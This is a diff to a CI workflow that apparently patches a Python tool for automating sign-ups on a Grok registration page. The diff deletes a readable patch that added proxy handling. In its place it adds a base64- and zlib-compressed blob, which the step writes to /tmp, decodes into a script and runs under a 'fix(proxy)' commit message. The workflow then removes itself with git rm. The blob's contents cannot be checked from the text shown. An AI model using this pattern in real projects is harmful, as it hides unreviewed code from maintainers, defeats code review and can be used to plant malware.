@@ -40,596 +40,100 @@ jobs:
             fi
           }
 
+          cat > /tmp/apply_proxy_fix.py.z64 <<'Z64'
+          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
+          Z64
+
           python - <<'PY'
           from pathlib import Path
-
-          def replace_once(text, old, new, label):
-              if old not in text:
-                  raise SystemExit(f"missing expected block: {label}")
-              return text.replace(old, new, 1)
-
-          p = Path("grok_register_ttk.py")
-          s = p.read_text(encoding="utf-8-sig")
-
-          s = replace_once(
-              s,
-              "import json\n",
-              "import json\nimport base64\nimport select\nimport socket\nimport socketserver\nimport ssl\nimport urllib.parse\n",
-              "proxy helper imports",
+          import base64
+          import zlib
+          Path("/tmp/apply_proxy_fix.py").write_bytes(
+              zlib.decompress(base64.b64decode(Path("/tmp/apply_proxy_fix.py.z64").read_text()))
           )
-
-          old_get_proxies = '''def get_proxies():
-    proxy = config.get("proxy", "")
-    if proxy:
-        return {"http": proxy, "https": proxy}
-    return {}
-'''
-          new_get_proxies = '''def get_configured_proxy():
-    return str(config.get("proxy", "") or "").strip()
-
-
-def get_proxies():
-    proxy = get_configured_proxy()
-    if proxy:
-        return {"http": proxy, "https": proxy}
-    return {}
-
-
-def _parse_proxy_url(proxy):
-    raw = str(proxy or "").strip()
-    if not raw:
-        return None
-    if "://" not in raw:
-        raw = "http://" + raw
-    try:
-        return urllib.parse.urlsplit(raw)
-    except Exception:
-        return None
-
-
-def _safe_proxy_port(parsed):
-    try:
-        return parsed.port
-    except Exception:
-        return None
-
-
-def _proxy_has_auth(proxy):
-    parsed = _parse_proxy_url(proxy)
-    return bool(parsed and parsed.hostname and (parsed.username is not None or parsed.password is not None))
-
-
-def _strip_proxy_auth(proxy):
-    raw = str(proxy or "").strip()
-    parsed = _parse_proxy_url(raw)
-    if not parsed or not parsed.hostname:
-        return raw
-    host = parsed.hostname
-    if ":" in host and not host.startswith("["):
-        host = f"[{host}]"
-    port = _safe_proxy_port(parsed)
-    netloc = f"{host}:{port}" if port else host
-    stripped = urllib.parse.urlunsplit((parsed.scheme or "http", netloc, parsed.path, parsed.query, parsed.fragment))
-    if "://" not in raw:
-        return stripped.split("://", 1)[1]
-    return stripped
-
-
-def _proxy_endpoint_terms(proxy=None):
-    parsed = _parse_proxy_url(proxy or get_configured_proxy())
-    if not parsed or not parsed.hostname:
-        return []
-    terms = [parsed.hostname]
-    port = _safe_proxy_port(parsed)
-    if port:
-        terms.append(f"{parsed.hostname}:{port}")
-        terms.append(f"port {port}")
-    return [x.lower() for x in terms if x]
-
-
-def is_proxy_connection_error(exc):
-    if not get_configured_proxy():
-        return False
-    err = str(exc or "").lower()
-    if not err:
-        return False
-    if any(x in err for x in ("proxy", "tunnel", "socks")):
-        return True
-    connect_markers = (
-        "could not connect",
-        "failed to connect",
-        "connection refused",
-        "connection reset",
-        "connect error",
-        "timed out",
-        "timeout",
-    )
-    if any(x in err for x in connect_markers):
-        terms = _proxy_endpoint_terms()
-        if not terms or any(t in err for t in terms):
-            return True
-    return False
-
-
-def page_has_proxy_error(page_obj):
-    try:
-        url = str(getattr(page_obj, "url", "") or "")
-        title = str(page_obj.run_js("return document.title || ''") or "")
-        body = str(page_obj.run_js("return document.body ? document.body.innerText.slice(0, 2000) : ''") or "")
-    except Exception:
-        return False
-    text = f"{url}\n{title}\n{body}".lower()
-    return any(
-        marker in text
-        for marker in (
-            "err_proxy",
-            "proxy connection failed",
-            "proxy server",
-            "proxy authentication",
-            "tunnel connection failed",
-            "无法连接到代理服务器",
-            "代理服务器",
-        )
-    )
-
-
-class _ReusableThreadingTCPServer(socketserver.ThreadingTCPServer):
-    allow_reuse_address = True
-    daemon_threads = True
-
-
-def _proxy_recv_until_headers(sock, timeout=20, limit=65536):
-    sock.settimeout(timeout)
-    data = b""
-    while b"\r\n\r\n" not in data and len(data) < limit:
-        chunk = sock.recv(4096)
-        if not chunk:
-            break
-        data += chunk
-    return data
-
-
-def _proxy_relay(left, right, timeout=60):
-    left.settimeout(timeout)
-    right.settimeout(timeout)
-    sockets = [left, right]
-    while True:
-        readable, _, _ = select.select(sockets, [], [], timeout)
-        if not readable:
-            return
-        for sock in readable:
-            data = sock.recv(65536)
-            if not data:
-                return
-            peer = right if sock is left else left
-            peer.sendall(data)
-
-
-class _LocalAuthProxyBridgeHandler(socketserver.BaseRequestHandler):
-    def handle(self):
-        bridge = self.server.bridge
-        upstream = None
-        try:
-            initial = _proxy_recv_until_headers(self.request, timeout=bridge.timeout)
-            if not initial:
-                return
-            first_line = initial.split(b"\r\n", 1)[0].decode("latin1", "ignore")
-            if first_line.upper().startswith("CONNECT "):
-                target = first_line.split()[1]
-                upstream = bridge.open_upstream()
-                req = [f"CONNECT {target} HTTP/1.1", f"Host: {target}"]
-                if bridge.auth_header:
-                    req.append(f"Proxy-Authorization: Basic {bridge.auth_header}")
-                upstream.sendall(("\r\n".join(req) + "\r\n\r\n").encode("latin1"))
-                response = _proxy_recv_until_headers(upstream, timeout=bridge.timeout)
-                if response:
-                    self.request.sendall(response)
-                status = response.split(b"\r\n", 1)[0]
-                if b" 200 " not in status:
-                    return
-                _proxy_relay(self.request, upstream, timeout=bridge.relay_timeout)
-            else:
-                upstream = bridge.open_upstream()
-                upstream.sendall(bridge.inject_proxy_auth(initial))
-                _proxy_relay(self.request, upstream, timeout=bridge.relay_timeout)
-        except Exception:
-            return
-        finally:
-            if upstream is not None:
-                try:
-                    upstream.close()
-                except Exception:
-                    pass
-
-
-class LocalAuthProxyBridge:
-    def __init__(self, proxy_url):
-        parsed = _parse_proxy_url(proxy_url)
-        if not parsed or not parsed.hostname:
-            raise ValueError("认证代理地址格式无效")
-        if (parsed.scheme or "http").lower() not in ("http", "https"):
-            raise ValueError("Chromium 本地认证代理桥仅支持 http/https 上游代理")
-        self.upstream_scheme = (parsed.scheme or "http").lower()
-        self.upstream_host = parsed.hostname
-        self.upstream_port = _safe_proxy_port(parsed) or (443 if self.upstream_scheme == "https" else 80)
-        username = urllib.parse.unquote(parsed.username or "")
-        password = urllib.parse.unquote(parsed.password or "")
-        raw_auth = f"{username}:{password}".encode("utf-8")
-        self.auth_header = base64.b64encode(raw_auth).decode("ascii") if (username or password) else ""
-        self.timeout = 20
-        self.relay_timeout = 90
-        self.server = None
-        self.thread = None
-        self.local_proxy = ""
-
-    def open_upstream(self):
-        sock = socket.create_connection((self.upstream_host, self.upstream_port), timeout=self.timeout)
-        if self.upstream_scheme == "https":
-            context = ssl.create_default_context()
-            sock = context.wrap_socket(sock, server_hostname=self.upstream_host)
-        sock.settimeout(self.timeout)
-        return sock
-
-    def inject_proxy_auth(self, data):
-        if not self.auth_header or b"\r\n\r\n" not in data:
-            return data
-        if b"\r\nproxy-authorization:" in data.lower():
-            return data
-        head, body = data.split(b"\r\n\r\n", 1)
-        auth_line = f"Proxy-Authorization: Basic {self.auth_header}".encode("latin1")
-        return head + b"\r\n" + auth_line + b"\r\n\r\n" + body
-
-    def start(self):
-        self.server = _ReusableThreadingTCPServer(("127.0.0.1", 0), _LocalAuthProxyBridgeHandler)
-        self.server.bridge = self
-        port = self.server.server_address[1]
-        self.local_proxy = f"http://127.0.0.1:{port}"
-        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
-        self.thread.start()
-        return self.local_proxy
-
-    def stop(self):
-        if self.server is not None:
-            try:
-                self.server.shutdown()
-                self.server.server_close()
-            except Exception:
-                pass
-        self.server = None
-        self.thread = None
-        self.local_proxy = ""
-
-
-def stop_browser_proxy_bridge():
-    global browser_proxy_bridge
-    if browser_proxy_bridge is not None:
-        try:
-            browser_proxy_bridge.stop()
-        except Exception:
-            pass
-    browser_proxy_bridge = None
-
-
-def prepare_browser_proxy(use_proxy=True, log_callback=None):
-    proxy = get_configured_proxy()
-    if not use_proxy or not proxy:
-        return "", None
-    if _proxy_has_auth(proxy):
-        parsed = _parse_proxy_url(proxy)
-        scheme = (parsed.scheme or "http").lower() if parsed else ""
-        if scheme in ("http", "https"):
-            bridge = LocalAuthProxyBridge(proxy)
-            browser_proxy = bridge.start()
-            if log_callback:
-                log_callback(f"[*] 已为 Chromium 启动本地认证代理桥: {browser_proxy}")
-            return browser_proxy, bridge
-        stripped = _strip_proxy_auth(proxy)
-        if log_callback:
-            log_callback("[!] Chromium 暂不直接支持该认证代理协议，已使用去认证代理地址，失败将回退直连")
-        return stripped, None
-    return proxy, None
-'''
-          s = replace_once(s, old_get_proxies, new_get_proxies, "proxy helpers")
-
-          old_browser_http = '''def create_browser_options():
-    options = ChromiumOptions()
-    options.auto_port()
-    options.set_timeouts(base=1)
-    if os.path.exists(EXTENSION_PATH):
-        options.add_extension(EXTENSION_PATH)
-    return options
-
-
-def _build_request_kwargs(**kwargs):
-    request_kwargs = dict(kwargs)
-    proxies = request_kwargs.pop("proxies", None)
-    if proxies is None:
-        proxies = get_proxies()
-    if proxies:
-        request_kwargs["proxies"] = proxies
-    request_kwargs.setdefault("timeout", 15)
-    return request_kwargs
-
-
-def http_get(url, **kwargs):
-    try:
-        return requests.get(url, **_build_request_kwargs(**kwargs))
-    except Exception as exc:
-        err = str(exc)
-        # 代理不可用时自动回退为直连，避免整个流程直接失败
-        if "127.0.0.1 port 7890" in err or "Could not connect to server" in err:
-            retry_kwargs = dict(kwargs)
-            retry_kwargs["proxies"] = {}
-            return requests.get(url, **_build_request_kwargs(**retry_kwargs))
-        raise
-
-
-def http_post(url, **kwargs):
-    try:
-        return requests.post(url, **_build_request_kwargs(**kwargs))
-    except Exception as exc:
-        err = str(exc)
-        if "127.0.0.1 port 7890" in err or "Could not connect to server" in err:
-            retry_kwargs = dict(kwargs)
-            retry_kwargs["proxies"] = {}
-            return requests.post(url, **_build_request_kwargs(**retry_kwargs))
-        raise
-'''
-          new_browser_http = '''def apply_browser_proxy_option(options, proxy):
-    if not proxy:
-        return
-    if hasattr(options, "set_proxy"):
-        try:
-            options.set_proxy(proxy)
-            return
-        except Exception:
-            pass
-    if not hasattr(options, "set_argument"):
-        raise AttributeError("当前 DrissionPage ChromiumOptions 不支持设置浏览器代理")
-    try:
-        options.set_argument(f"--proxy-server={proxy}")
-    except TypeError:
-        options.set_argument("--proxy-server", proxy)
-
-
-def create_browser_options(browser_proxy=""):
-    options = ChromiumOptions()
-    options.auto_port()
-    options.set_timeouts(base=1)
-    apply_browser_proxy_option(options, browser_proxy)
-    if os.path.exists(EXTENSION_PATH):
-        options.add_extension(EXTENSION_PATH)
-    return options
-
-
-def _build_request_kwargs(**kwargs):
-    request_kwargs = dict(kwargs)
-    proxies = request_kwargs.pop("proxies", None)
-    if proxies is None:
-        proxies = get_proxies()
-    if proxies:
-        request_kwargs["proxies"] = proxies
-    request_kwargs.setdefault("timeout", 15)
-    return request_kwargs
-
-
-def http_get(url, **kwargs):
-    request_kwargs = _build_request_kwargs(**kwargs)
-    try:
-        return requests.get(url, **request_kwargs)
-    except Exception as exc:
-        if request_kwargs.get("proxies") and is_proxy_connection_error(exc):
-            retry_kwargs = dict(kwargs)
-            retry_kwargs["proxies"] = {}
-            return requests.get(url, **_build_request_kwargs(**retry_kwargs))
-        raise
-
-
-def http_post(url, **kwargs):
-    request_kwargs = _build_request_kwargs(**kwargs)
-    try:
-        return requests.post(url, **request_kwargs)
-    except Exception as exc:
-        if request_kwargs.get("proxies") and is_proxy_connection_error(exc):
-            retry_kwargs = dict(kwargs)
-            retry_kwargs["proxies"] = {}
-            return requests.post(url, **_build_request_kwargs(**retry_kwargs))
-        raise
-'''
-          s = replace_once(s, old_browser_http, new_browser_http, "browser options and HTTP proxy fallback")
-
-          s = s.replace(", proxies={}", "")
-
-          s = replace_once(
-              s,
-              "browser = None\npage = None\n",
-              "browser = None\npage = None\nbrowser_proxy_bridge = None\nbrowser_started_with_proxy = False\n",
-              "browser proxy globals",
-          )
-
-          old_start_stop = '''def start_browser(log_callback=None):
-    global browser, page
-    last_exc = None
-    for attempt in range(1, 5):
-        try:
-            browser = Chromium(create_browser_options())
-            tabs = browser.get_tabs()
-            page = tabs[-1] if tabs else browser.new_tab()
-            if log_callback and getattr(browser, "user_data_path", None):
-                log_callback(f"[Debug] 当前浏览器资料目录: {browser.user_data_path}")
-            if log_callback and attempt > 1:
-                log_callback(f"[*] 浏览器第 {attempt} 次启动成功")
-            return browser, page
-        except Exception as exc:
-            last_exc = exc
-            if log_callback:
-                log_callback(f"[Debug] 浏览器启动失败(第{attempt}/4次): {exc}")
-            try:
-                if browser is not None:
-                    browser.quit(del_data=True)
-            except Exception:
-                pass
-            browser = None
-            page = None
-            time.sleep(min(1.5 * attempt, 4))
-    raise Exception(f"浏览器启动失败，已重试4次: {last_exc}")
-
-
-def stop_browser():
-    global browser, page
-    if browser is not None:
-        try:
-            browser.quit(del_data=True)
-        except Exception:
-            pass
-    browser = None
-    page = None
-
-
-def restart_browser(log_callback=None):
-    stop_browser()
-    return start_browser(log_callback=log_callback)
-'''
-          new_start_stop = '''def start_browser(log_callback=None, use_proxy=True):
-    global browser, page, browser_proxy_bridge, browser_started_with_proxy
-    last_exc = None
-    proxy_enabled = bool(use_proxy and get_configured_proxy())
-    for attempt in range(1, 5):
-        bridge = None
-        try:
-            browser_proxy, bridge = prepare_browser_proxy(use_proxy=use_proxy, log_callback=log_callback)
-            browser = Chromium(create_browser_options(browser_proxy=browser_proxy))
-            browser_proxy_bridge = bridge
-            browser_started_with_proxy = bool(browser_proxy)
-            tabs = browser.get_tabs()
-            page = tabs[-1] if tabs else browser.new_tab()
-            if log_callback and getattr(browser, "user_data_path", None):
-                log_callback(f"[Debug] 当前浏览器资料目录: {browser.user_data_path}")
-            if log_callback and get_configured_proxy():
-                mode = "代理" if browser_started_with_proxy else "直连"
-                log_callback(f"[*] 浏览器网络模式: {mode}")
-            if log_callback and attempt > 1:
-                log_callback(f"[*] 浏览器第 {attempt} 次启动成功")
-            return browser, page
-        except Exception as exc:
-            last_exc = exc
-            if bridge is not None:
-                try:
-                    bridge.stop()
-                except Exception:
-                    pass
-            if log_callback:
-                mode = "代理" if proxy_enabled else "直连"
-                log_callback(f"[Debug] 浏览器{mode}启动失败(第{attempt}/4次): {exc}")
-            try:
-                if browser is not None:
-                    browser.quit(del_data=True)
-            except Exception:
-                pass
-            browser = None
-            page = None
-            browser_proxy_bridge = None
-            browser_started_with_proxy = False
-            time.sleep(min(1.5 * attempt, 4))
-    raise Exception(f"浏览器启动失败，已重试4次: {last_exc}")
-
-
-def stop_browser():
-    global browser, page, browser_started_with_proxy
-    if browser is not None:
-        try:
-            browser.quit(del_data=True)
-        except Exception:
-            pass
-    stop_browser_proxy_bridge()
-    browser = None
-    page = None
-    browser_started_with_proxy = False
-
-
-def restart_browser(log_callback=None, use_proxy=True):
-    stop_browser()
-    return start_browser(log_callback=log_callback, use_proxy=use_proxy)
-'''
-          s = replace_once(s, old_start_stop, new_start_stop, "browser lifecycle proxy handling")
-
-          old_open_signup = '''def open_signup_page(log_callback=None, cancel_callback=None):
-    global browser, page
-    raise_if_cancelled(cancel_callback)
-    if browser is None:
-        start_browser()
-        if log_callback:
-            log_callback("[*] 浏览器已启动")
-    try:
-        page = browser.get_tab(0)
-        page.get(SIGNUP_URL)
-    except Exception as e:
-        if log_callback:
-            log_callback(f"[Debug] 打开URL异常: {e}")
-        try:
-            page = browser.new_tab(SIGNUP_URL)
-        except Exception as e2:
-            if log_callback:
-                log_callback(f"[Debug] 创建新标签页异常: {e2}")
-            restart_browser()
-            page = browser.new_tab(SIGNUP_URL)
-    page.wait.doc_loaded()
-    sleep_with_cancel(2, cancel_callback)
-    if log_callback:
-        log_callback(f"[*] 当前URL: {page.url}")
-    click_email_signup_button(
-        log_callback=log_callback, cancel_callback=cancel_callback
-    )
-'''
-          new_open_signup = '''def open_signup_page(log_callback=None, cancel_callback=None):
-    global browser, page
-    raise_if_cancelled(cancel_callback)
-    if browser is None:
-        start_browser(log_callback=log_callback)
-        if log_callback:
-            log_callback("[*] 浏览器已启动")
-
-    def _open_with_current_browser():
-        global page
-        try:
-            page = browser.get_tab(0)
-            page.get(SIGNUP_URL)
-        except Exception as e:
-            if log_callback:
-                log_callback(f"[Debug] 打开URL异常: {e}")
-            page = browser.new_tab(SIGNUP_URL)
-        page.wait.doc_loaded()
-
-    try:
-        _open_with_current_browser()
-    except Exception as e:
-        if browser_started_with_proxy and get_configured_proxy():
-            if log_callback:
-                log_callback(f"[!] 浏览器代理访问注册页失败，自动回退直连: {e}")
-            restart_browser(log_callback=log_callback, use_proxy=False)
-            _open_with_current_browser()
-        else:
-            raise
-
-    if browser_started_with_proxy and page_has_proxy_error(page):
-        if log_callback:
-            log_callback("[!] 浏览器页面显示代理错误，自动回退直连")
-        restart_browser(log_callback=log_callback, use_proxy=False)
-        _open_with_current_browser()
-
-    sleep_with_cancel(2, cancel_callback)
-    if log_callback:
-        log_callback(f"[*] 当前URL: {page.url}")
-    click_email_signup_button(
-        log_callback=log_callback, cancel_callback=cancel_callback
-    )
-'''
-          s = replace_once(s, old_open_signup, new_open_signup, "signup page proxy fallback")
-
-          compile(s, str(p), "exec")
-          p.write_text(s, encoding="utf-8-sig")
           PY
 
+          python /tmp/apply_proxy_fix.py
           commit_if_changed "fix(proxy): route browser traffic through configured proxy" grok_register_ttk.py
 
           git rm .github/workflows/apply-main-fixes.yml .github/apply-main-fixes-trigger.txt
